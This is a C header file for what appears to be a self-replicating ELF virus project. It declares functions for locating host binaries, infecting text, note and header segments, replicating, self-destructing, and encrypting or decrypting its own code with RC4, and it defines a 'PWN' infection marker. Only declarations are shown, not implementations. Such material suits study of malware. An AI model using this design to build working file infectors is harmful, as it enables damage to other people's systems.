#ifndef WAR_H
#define WAR_H
#define _GNU_SOURCE

////////////////////////////////////////////////////////////////////////////////
/// INCLUDES 
////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <stdlib.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include <sched.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/random.h>
#include <limits.h>
#include <errno.h>

#include "./logger.h"

////////////////////////////////////////////////////////////////////////////////
/// MACROS 
////////////////////////////////////////////////////////////////////////////////

#define ELF_MAGIC_NUMBER 1179403647
#define PWN_MAGIC_NUMBER 0x4e5750

#define BUFF_SIZE 0x2000
#define JUMP_SIZE 0x4
#define STUB_SIZE 0x16e
#define PAGE_SIZE 0x1000
#define FCNT_SIZE 0x7

#define ADDR_OFFSET 0x4f
#define SIZE_OFFSET 0x54

#define TARGET "antivirus"

#define DEFAULT_KEY_SIZE 0x8

////////////////////////////////////////////////////////////////////////////////
/// ENUMS
////////////////////////////////////////////////////////////////////////////////

enum e_context
{
	SUCCESS,
	FAILURE,
	ABORT,
	CONTEXT_SIZE,
};

enum e_segment
{
	TEXT,
	DATA,
	NOTE,
	SEGMENT_SIZE,
};

enum e_entry
{
	OLD,
	NEW,
	ENTRY_SIZE,
};

enum e_key
{
	LEFT,
	RIGHT,
	KEY_SIZE,
};

////////////////////////////////////////////////////////////////////////////////
/// STRUCTURES
////////////////////////////////////////////////////////////////////////////////

struct linux_dirent64
{
	uint64_t d_ino;
	int64_t d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[];
};

struct s_directory
{
	char path[PATH_MAX];
	ssize_t entry;
};

struct s_host
{
	Elf64_Ehdr *header;
	Elf64_Phdr *segment[SEGMENT_SIZE];
	Elf64_Addr entry[ENTRY_SIZE];

	size_t filesize;
	char *filename;

	void *rsp;
};

struct s_keychain
{
	int key[KEY_SIZE];
	size_t junk[KEY_SIZE][KEY_SIZE];
};

////////////////////////////////////////////////////////////////////////////////
/// DECLARATIONS 
////////////////////////////////////////////////////////////////////////////////

// PRELOAD
void preload(void);

// ENTRY
void __entry(void);

// WAR
void antivirus(struct s_host *host, struct s_keychain *keychain, enum e_context context);
void init(struct s_host *host, struct s_keychain *keychain, enum e_context context);
void find_host(struct s_host *host, struct s_keychain *keychain, void *dir, const size_t size, enum e_context context);
void host_constructor(struct s_host *host, struct s_keychain *keychain, char *filename, enum e_context context);
void criteria(struct s_host *host, struct s_keychain *keychain, enum e_context context);
void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_context contect);
void note_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
void replicate(struct s_host *host, struct s_keychain *keychain, enum e_context context);
void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_context context);
void execution(const struct s_host *host, const struct s_keychain *keychain, const enum e_context context);

// LIB_C 
uid_t _getuid(void);
ssize_t _read(int fd, void *buf, size_t count);
int _open(const char *pathname, int flags, mode_t mode);
int _close(int fd);
int _getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
ssize_t _getrandom(void *buf, size_t buflen, unsigned int flags);
int _stat(const char *filename, struct stat *statbuf);
void *_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
ssize_t _write(int fd, const void *buf, size_t count);
int _munmap(void *addr, size_t length);
void _fatal(void);
int _execve(const char *filename, char *const argv[], char *const envp[]);
pid_t _fork(void);
pid_t _wait4(pid_t pid, int *wstatus, int options, struct rusage *rusage);
size_t _strlen(const char *str);
void _bzero(char *str, const size_t size);
size_t _get_random_integer(const size_t range);
void _memcpy(void *dst, void const *src, const size_t size);
int _strncmp(const char *s1, const char *s2, size_t n);
void update_keychain_left(struct s_keychain *keychain, const char *caller, const size_t size);
void update_keychain_right(struct s_keychain *keychain, const char *caller, const size_t size);
void decrypt_left(const struct s_keychain *keychain, char *callee, const size_t size);
void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size);

// LIB_S
void L1(void);
void RC4(const unsigned char *key, const size_t key_length, char *data, const size_t data_length);

// EXIT
void __exit(void);

#endif
